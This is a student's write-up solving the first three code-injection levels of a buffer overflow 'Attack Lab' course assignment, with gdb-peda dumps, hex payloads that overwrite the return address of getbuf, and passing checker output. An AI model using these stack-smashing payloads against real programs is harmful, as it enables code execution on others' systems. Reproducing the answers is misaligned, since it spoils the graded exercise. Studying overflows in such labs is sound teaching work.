
The Attack Lab: Understanding Buffer Overflow Bugs
===
20190084 권민재, CSED211

# preface
 Using [gdb-peda](https://github.com/longld/peda) with AT&T syntax.

# Part I: Code Injection Attacks
## Level 1
```shell script
gdb-peda$ disas getbuf
Dump of assembler code for function getbuf:
   0x0000000000401863 <+0>:	sub    $0x18,%rsp
   0x0000000000401867 <+4>:	mov    %rsp,%rdi
   0x000000000040186a <+7>:	callq  0x401aed <Gets>
   0x000000000040186f <+12>:	mov    $0x1,%eax
   0x0000000000401874 <+17>:	add    $0x18,%rsp
   0x0000000000401878 <+21>:	retq   
End of assembler dump.
```

```shell script
gdb-peda$ p touch1
$1 = {void ()} 0x401879 <touch1>
```

```python
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
79 18 40 00 00 00 00 00
```

```shell script
 beta@plus  ~/beta/CSED/CSED211/ASSN/ASSN3   master ●  cat sol1.hex | ./hex2raw | ./ctarget -q
Cookie: 0x78960173
Type string:Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
	user id	84
	course	15213-f15
	lab	attacklab
	result	84:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 79 18 40 00 00 00 00 00
```

## Level 2

```shell script
gdb-peda$ b *0x0000000000401863
Breakpoint 5 at 0x401863: file buf.c, line 12.
gdb-peda$ r -q
Starting program: /home/beta/beta/CSED/CSED211/ASSN/ASSN3/ctarget -q
Cookie: 0x78960173

[----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x55586000 --> 0x0 
RCX: 0xc ('\x0c')
RDX: 0x7ffff7dd3780 --> 0x0 
RSI: 0xc ('\x0c')
RDI: 0x60701c --> 0xa333731303639 ('960173\n')
RBP: 0x55685fe8 --> 0x4030e5 --> 0x3a6968003a697168 ('hqi:')
RSP: 0x5560d650 --> 0x401a32 (<test+14>:	mov    %eax,%edx)
RIP: 0x401863 (<getbuf>:	sub    $0x18,%rsp)
R8 : 0x7ffff7fcd700 (0x00007ffff7fcd700)
R9 : 0xc ('\x0c')
R10: 0x4033f4 ("Type string:")
R11: 0x7ffff7b7fa30 (<__memset_avx2>:	vpxor  %xmm0,%xmm0,%xmm0)
R12: 0x2 
R13: 0x0 
R14: 0x0 
R15: 0x0
EFLAGS: 0x212 (carry parity ADJUST zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x401859 <scramble+1226>:	callq  0x400cf0 <__stack_chk_fail@plt>
   0x40185e <scramble+1231>:	add    $0x38,%rsp
   0x401862 <scramble+1235>:	retq   
=> 0x401863 <getbuf>:	sub    $0x18,%rsp
   0x401867 <getbuf+4>:	mov    %rsp,%rdi
   0x40186a <getbuf+7>:	callq  0x401aed <Gets>
   0x40186f <getbuf+12>:	mov    $0x1,%eax
   0x401874 <getbuf+17>:	add    $0x18,%rsp
[------------------------------------stack-------------------------------------]
0000| 0x5560d650 --> 0x401a32 (<test+14>:	mov    %eax,%edx)
0008| 0x5560d658 --> 0x2 
0016| 0x5560d660 --> 0x401fc9 (<launch+112>:	cmpl   $0x0,0x203558(%rip)        # 0x605528 <is_checker>)
0024| 0x5560d668 --> 0x0 
0032| 0x5560d670 --> 0xf4f4f4f4f4f4f4f4 
0040| 0x5560d678 --> 0xf4f4f4f4f4f4f4f4 
0048| 0x5560d680 --> 0xf4f4f4f4f4f4f4f4 
0056| 0x5560d688 --> 0xf4f4f4f4f4f4f4f4 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 5, getbuf () at buf.c:12
12	in buf.c
```

```shell script
gdb-peda$ vmm 0x5560d650
Start              End                Perm	Name
0x55586000         0x55686000         rwxp	mapped
```

```
gdb-peda$ p touch2
$2 = {void (unsigned int)} 0x4018a5 <touch2>

```

```
buf
stack add. (rsp + 24) 0
argument 8
touch2 16
pop rdi 24
ret 32
```
```python
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
68 d6 60 55 00 00 00 00
73 01 96 78 00 00 00 00
a5 18 40 00 00 00 00 00
5f
c3
```

```shell script
 beta@plus  ~/beta/CSED/CSED211/ASSN/ASSN3   master ●  cat sol2.hex | ./hex2raw | ./ctarget -q
Cookie: 0x78960173
Type string:Touch2!: You called touch2(0x78960173)
Valid solution for level 2 with target ctarget
PASS: Would have posted the following:
	user id	84
	course	15213-f15
	lab	attacklab
	result	84:PASS:0xffffffff:ctarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 68 D6 60 55 00 00 00 00 73 01 96 78 00 00 00 00 A5 18 40 00 00 00 00 00 5F C3 
```

## Level 3
```
gdb-peda$ p touch3
$2 = {void (char *)} 0x4019b6 <touch3>
```
```
buf
stack add. (rsp + 40)  <= 0
argument (rsp + 24) 8
touch3 add. (touch3) 16
string 24
null 32
pop rdi 40
retq 48
```
```python
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 d6 60 55 00 00 00 00
68 d6 60 55 00 00 00 00
b6 19 40 00 00 00 00 00
37 38 39 36 30 31 37 33
00 00 00 00 00 00 00 00
5f
c3
```

```
 beta@plus  ~/beta/CSED/CSED211/ASSN/ASSN3   master ●  cat sol3.hex | ./hex2raw | ./ctarget -q
Cookie: 0x78960173
Type string:Touch3!: You called touch3("78960173")
Valid solution for level 3 with target ctarget
PASS: Would have posted the following:
	user id	84
	course	15213-f15
	lab	attacklab
	result	84:PASS:0xffffffff:ctarget:3:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 D6 60 55 00 00 00 00 68 D6 60 55 00 00 00 00 B6 19 40 00 00 00 00 00 37 38 39 36 30 31 37 33 00 00 00 00 00 00 00 00 5F C3
```